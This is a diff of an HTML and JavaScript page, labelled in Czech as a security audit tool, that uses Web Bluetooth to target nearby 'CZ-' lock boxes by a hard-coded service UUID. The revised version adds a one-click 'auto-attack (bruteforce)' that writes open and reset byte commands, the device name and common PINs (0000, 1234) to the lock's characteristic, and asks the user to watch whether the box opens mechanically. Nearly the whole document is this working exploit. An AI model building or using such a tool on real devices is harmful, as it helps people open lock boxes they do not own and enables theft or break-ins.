@@ -3,85 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Audit Tool v2.0</title>
+    <title>BOX SECURITY AUDIT v3.0 🔱</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
-        .panel { border: 1px solid #00ff00; padding: 15px; border-radius: 5px; margin-bottom: 10px; }
-        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; width: 100%; font-weight: bold; }
-        button:hover { background: #00ff00; color: #000; }
-        #log { background: #000; border: 1px solid #444; height: 250px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #aaa; }
-        .status { color: #fff; font-weight: bold; margin-bottom: 10px; }
+        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 15px; margin: 0; }
+        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
+        .panel { border: 1px solid #00ff41; padding: 15px; border-radius: 5px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); }
+        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; cursor: pointer; width: 100%; font-size: 14px; font-weight: bold; text-transform: uppercase; }
+        button:hover { background: #00ff41; color: #000; }
+        button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
+        input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; width: calc(100% - 24px); margin-bottom: 10px; }
+        #log { background: #000; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #00ff41; line-height: 1.4; }
+        .status-bar { font-size: 12px; margin-bottom: 10px; color: #fff; }
+        .danger { border-color: #ff0000; color: #ff0000; }
+        .danger:hover { background: #ff0000; color: #000; }
     </style>
 </head>
 <body>
-    <h1>SYSTEM AUDIT: CZ-LOKJ 🔱</h1>
-    
-    <div class="panel">
-        <div class="status" id="status">Stav: Odpojeno</div>
-        <button onclick="connect()">1. NAVÁZAT SPOJENÍ</button>
-    </div>
 
-    <div class="panel">
-        <strong>ATTACK VECTORS (HEX):</strong>
-        <button onclick="sendHex([0x01])">POVEL: 01 (START)</button>
-        <button onclick="sendHex([0x00])">POVEL: 00 (RESET)</button>
-        <button onclick="sendHex([0x01, 0x01])">POVEL: 01 01 (DOUBLE)</button>
-        <button onclick="sendHex([0xFF, 0xFF, 0xFF, 0xFF])">POVEL: FULL BURST (FF)</button>
-    </div>
+<div class="header">
+    <h2>SYSTEM AUDIT: CZ-BOX 🔱</h2>
+</div>
 
-    <div class="panel">
-        <strong>PIN BYPASS (TEXT):</strong>
-        <input type="text" id="pinInput" placeholder="Zadej PIN (např. 123456)" style="width: 70%; padding: 5px;">
-        <button onclick="sendText()" style="width: 25%;">ODESLAT</button>
-    </div>
+<div class="panel">
+    <div class="status-bar" id="status">STATUS: DISCONNECTED</div>
+    <button onclick="connect()">1. NAVÁZAT SPOJENÍ (SCAN)</button>
+</div>
 
-    <div id="log">--- SYSTEM LOG READY ---<br></div>
+<div class="panel">
+    <strong>AUTOMATICKÝ ÚTOČNÝ VEKTOR:</strong>
+    <button class="danger" id="attackBtn" onclick="startAutoAttack()" disabled>SPUSTIT AUTO-ATTACK (BRUTEFORCE)</button>
+</div>
 
-    <script>
-        let char;
-        const S_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c65';
-        const C_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c-31';
+<div class="panel">
+    <strong>MANUÁLNÍ VSTUP (TEXT/PIN):</strong>
+    <input type="text" id="userInput" placeholder="Zadej PIN nebo název boxu">
+    <button onclick="sendManualText()">ODESLAT JAKO TEXT (UTF-8)</button>
+    <button onclick="sendManualHex()">ODESLAT JAKO HEX (BYTE)</button>
+</div>
 
-        async function log(m) {
-            const l = document.getElementById('log');
-            l.innerHTML += `> ${m}<br>`;
-            l.scrollTop = l.scrollHeight;
+<div id="log">--- INICIALIZACE SYSTÉMU ---<br></div>
+
+<script>
+    let device, server, service, characteristic;
+    let deviceName = "";
+
+    // UUID definované systémem CZ-LOKJ (z tvých fotek)
+    const SERVICE_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c65';
+    const CHARACTERISTIC_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c-31';
+
+    function log(msg) {
+        const logDiv = document.getElementById('log');
+        const now = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `[${now}] > ${msg}<br>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    async function connect() {
+        try {
+            log("Skenuji okolí pro CZ- zařízení...");
+            device = await navigator.bluetooth.requestDevice({
+                filters: [{ namePrefix: 'CZ-' }],
+                optionalServices: [SERVICE_UUID]
+            });
+
+            log(`Nalezeno: ${device.name}. Připojuji se...`);
+            deviceName = device.name;
+            
+            server = await device.gatt.connect();
+            service = await server.getPrimaryService(SERVICE_UUID);
+            characteristic = await service.getCharacteristic(CHARACTERISTIC_UUID);
+
+            document.getElementById('status').innerText = `STATUS: CONNECTED [${deviceName}]`;
+            document.getElementById('attackBtn').disabled = false;
+            log("✅ SPOJENÍ NAVÁZÁNO. Exploit kanál otevřen.");
+
+        } catch (error) {
+            log("❌ CHYBA PŘIPOJENÍ: " + error);
         }
+    }
 
-        async function connect() {
-            try {
-                log("Hledám CZ zařízení...");
-                const device = await navigator.bluetooth.requestDevice({
-                    filters: [{ namePrefix: 'CZ-' }],
-                    optionalServices: [S_UUID]
-                });
-                const server = await device.gatt.connect();
-                const service = await server.getPrimaryService(S_UUID);
-                char = await service.getCharacteristic(C_UUID);
-                document.getElementById('status').innerText = "Stav: PŘIPOJENO k " + device.name;
-                log("✅ Exploit kanál připraven.");
-            } catch (e) { log("❌ CHYBA: " + e); }
+    async function sendRaw(data) {
+        if (!characteristic) return;
+        try {
+            await characteristic.writeValue(data);
+            return true;
+        } catch (e) {
+            log(`❌ Paket selhal: ${e.message}`);
+            return false;
         }
+    }
 
-        async function sendHex(bytes) {
-            if(!char) return log("⚠️ Nejdřív se připoj!");
-            try {
-                log(`Odesílám HEX: ${bytes.map(b => b.toString(16)).join(' ')}`);
-                await char.writeValue(new Uint8Array(bytes));
-                log("✅ Paket doručen.");
-            } catch (e) { log("❌ Zamítnuto: " + e); }
-        }
+    async function startAutoAttack() {
+        log("🚀 SPUŠTĚN AUTOMATICKÝ ÚTOK...");
+        
+        // Seznam testovacích vektorů
+        const vectors = [
+            { name: "Global Open", data: new Uint8Array([0x01]) },
+            { name: "Zero Reset", data: new Uint8Array([0x00]) },
+            { name: "Double Confirm", data: new Uint8Array([0x01, 0x01]) },
+            { name: "Full Burst", data: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
+            { name: "Device Name Key", data: new TextEncoder().encode(deviceName) },
+            { name: "Common PIN 0000", data: new TextEncoder().encode("0000") },
+            { name: "Common PIN 1234", data: new TextEncoder().encode("1234") }
+        ];
 
-        async function sendText() {
-            if(!char) return log("⚠️ Nejdřív se připoj!");
-            const val = document.getElementById('pinInput').value;
-            try {
-                log(`Zkouším PIN bypass: ${val}`);
-                let enc = new TextEncoder();
-                await char.writeValue(enc.encode(val));
-                log("✅ PIN paket odeslán.");
-            } catch (e) { log("❌ Chyba: " + e); }
+        for (const v of vectors) {
+            log(`Testuji vektor: ${v.name}...`);
+            const success = await sendRaw(v.data);
+            if (success) log(`✅ Paket ${v.name} doručen.`);
+            await new Promise(r => setTimeout(r, 600)); // Pauza pro zpracování boxem
         }
-    </script>
+        log("🏁 ÚTOK DOKONČEN. Sleduj mechanickou reakci boxu.");
+    }
+
+    async function sendManualText() {
+        const val = document.getElementById('userInput').value;
+        if (!val) return log("⚠️ Zadej text.");
+        log(`Posílám text: ${val}`);
+        const success = await sendRaw(new TextEncoder().encode(val));
+        if (success) log("✅ Text odeslán.");
+    }
+
+    async function sendManualHex() {
+        const val = document.getElementById('userInput').value;
+        if (!val) return log("⚠️ Zadej HEX (např. 01ff).");
+        try {
+            const hex = new Uint8Array(val.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            log(`Posílám HEX: ${val}`);
+            const success = await sendRaw(hex);
+            if (success) log("✅ HEX odeslán.");
+        } catch (e) {
+            log("❌ Neplatný HEX formát.");
+        }
+    }
+</script>
+
 </body>
 </html>
